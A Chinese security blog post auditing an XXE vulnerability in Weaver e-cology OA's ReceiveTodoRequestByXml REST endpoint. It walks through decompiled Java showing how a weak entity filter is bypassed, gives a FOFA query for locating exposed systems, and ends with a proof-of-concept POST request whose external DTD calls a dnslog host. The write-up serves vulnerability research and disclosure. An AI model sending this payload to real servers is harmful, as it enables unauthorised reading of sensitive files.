---
title: "泛微OA ReceiveTodoRequestByXml XML实体注入漏洞"
source: https://mrxn.net/jswz/e-cology-ReceiveTodoRequestByXml-xmlToMap-XXE.html
asset_dir: assets/泛微oa-receivetodorequestbyxml-xml实体注入漏洞
---

# 泛微OA ReceiveTodoRequestByXml XML实体注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/1/10 19:18
- 2141浏览
- [0评论](#comment)
- 40分钟阅读

深入探索

表现层状态转换

计算机安全

安全

---

# 简介

泛微e-cology是一款由泛微网络科技开发的协同管理平台，支持人力资源、财务、行政等多功能管理和移动办公。[泛微e-cology](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE "泛微e-cology")系统接口/rest/ofs/ReceiveTodoRequestByXml、ProcessOverRequestByXml、ProcessDoneRequestByXml 存在[XXE漏洞](https://mrxn.net/tag/XXE "XXE漏洞")，未经的攻击者可以利用此漏洞读取系统内部敏感文件，获取敏感信息，使系统处于极不安全的状态。

代码安全审计

# FOFA 语法

> `app="泛微-协同商务系统"`

# 漏洞分析

除了今天的这三个点，此前互联网已经披露 `ReceiveCCRequestByXml`、`ReceiveRequestInfoByXml`、`deleteUserRequestInfoByXml`、`deleteRequestInfoByXml` 这几个XXE漏洞点，其实漏洞成因也是一样的，这里只是简单记录下[代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1 "代码审计")过程。

[[![泛微OA ReceiveTodoRequestByXml XML实体注入漏洞](images/img-001-7b5df0ac4339.png)](https://mrxn.net/content/uploadfile/202501/5b9c1736509382.png)](https://mrxn.net/content/uploadfile/202501/5b9c1736509382.png)

ReceiveTodoRequestByXml 实现逻辑代码如下

漏洞扫描服务

```
public class ReceiveTodoRequestByXml implements IRestService {
    private OfsTodoDataManager ofsTodoDataManager = new OfsTodoDataManager();

    public ReceiveTodoRequestByXml() {
    }

    public IRestService.RestType getType() {
        return RestType.POST;
    }

    public String getURI() {
        return "/rest/ofs/ReceiveTodoRequestByXml";
    }

    public void service(IRestRequest var1, IRestResponse var2) throws RestException {
        HttpServletRequest var3 = var1.getHttpRequest();
        Response var4 = new Response();
        String var5 = ServletUtil.getServletInputStreamContent(var3, "UTF-8");
        if (!"".equals(var5)) {
            this.ofsTodoDataManager.setClientIp(Util.getIpAddr(var3));
            String var6 = this.ofsTodoDataManager.ReceiveTodoRequestByXml(var5);
            var4.addMessage("result", var6);
        }

        var2.writeReponse(var4);
    }
}
```

- 首先检查 `var5` 是否为空字符串。如果 `var5` 不为空，执行后续逻辑。
- 调用 `ofsTodoDataManager.ReceiveTodoRequestByXml(var5)` 方法，将 `var5`（即 XML 数据）传递给 `ofsTodoDataManager` 进行处理。

getServletInputStreamContent 函数代码如下

计算机科学

```
public static String getServletInputStreamContent(HttpServletRequest var0, String var1) {
        StringBuffer var2 = new StringBuffer();

        try {
            ServletInputStream var3 = var0.getInputStream();
            BufferedReader var4 = new BufferedReader(new InputStreamReader(var3, var1));
            String var5 = "";

            while((var5 = var4.readLine()) != null) {
                var2.append(var5);
                var2.append("\n");
            }
        } catch (IOException var6) {
            var6.printStackTrace();
        }

        return var2.toString();
    }
```

如果 var5 不为 null，将 var5 追加到 var2 中，并在每行末尾添加换行符 `"\n"`，然后返回给 var5。

文件大小转换

ReceiveTodoRequestByXml 函数代码如下

```
public String ReceiveTodoRequestByXml(String var1) {
        var1 = SecurityMethodUtil.clearEntity(var1);
        Map var2 = OfsUtils.xmlToMap(var1);
        Map var3 = this.receiveCCRequestByMap(var2);
        String var4 = OfsUtils.mapToXml(var3, "ResultInfo");
        return var4;
    }
```

其中 SecurityMethodUtil.clearEntity 如下

```
public static String clearEntity(String var0) {
        if (var0 != null && !"".equals(var0)) {
            return var0.toLowerCase().indexOf("entity") == -1 ? var0 : var0.replaceAll("(?i)\\<\\!entity ", "*");
        } else {
            return var0;
        }
    }
```

主要作用是清除字符串中所有不区分大小写的 `<!ENTITY` 声明，将其替换为 `*`，如果字符串为空或为 null，则直接返回原字符串。因此我们的payload里不能出现 `<!ENTITY` 声明。

xmlToMap 函数如下

```
public static Map<String, String> xmlToMap(String var0) {
        HashMap var1 = new HashMap();

        try {
            Document var2 = DocumentHelper.parseText(var0);
            if (var2 == null) {
                return var1;
            }

            Element var3 = var2.getRootElement();
            Iterator var4 = var3.elementIterator();

            while(var4.hasNext()) {
                Element var5 = (Element)var4.next();
                List var6 = var5.elements();
                var1.put(var5.getName(), var5.getText());
            }
        } catch (Exception var7) {
            var7.printStackTrace();
        }

        return var1;
    }
```

通过 `org.dom4j.DocumentHelper.parseText` 解析XML,从而造成XXE漏洞。

漏洞扫描服务

# 漏洞复现

```
POST /rest/ofs/ReceiveTodoRequestByXml HTTP/1.1
Host: fanwei.mrxn.net
Content-Type: application/xml

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE syscode SYSTEM "http://ReceiveTodoRequestByXml.xxxx.dnslog.pw/xxe">
<M><syscode>&send;</syscode></M>
```

[[![泛微OA ReceiveTodoRequestByXml XML实体注入漏洞](images/img-002-ba086a8616d3.png)](https://mrxn.net/content/uploadfile/202501/7c931736510738.png)](https://mrxn.net/content/uploadfile/202501/7c931736510738.png)

Dnslog 平台成功收到了响应  
[[![泛微OA ReceiveTodoRequestByXml XML实体注入漏洞](images/img-003-4e8738937358.png)](https://mrxn.net/content/uploadfile/202501/b6dd1736510854.png)](https://mrxn.net/content/uploadfile/202501/b6dd1736510854.png)

另外两个点的[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞") ProcessOverRequestByXml、ProcessDoneRequestByXml 是一样的利用方式，就不重复测试了。

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)
- [#XXE](https://mrxn.net/tag/XXE)

---

文章目录

- [1.简介](#toc-1-)
- [2.FOFA 语法](#toc-2-)
- [3.漏洞分析](#toc-3-)
- [4.漏洞复现](#toc-4-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
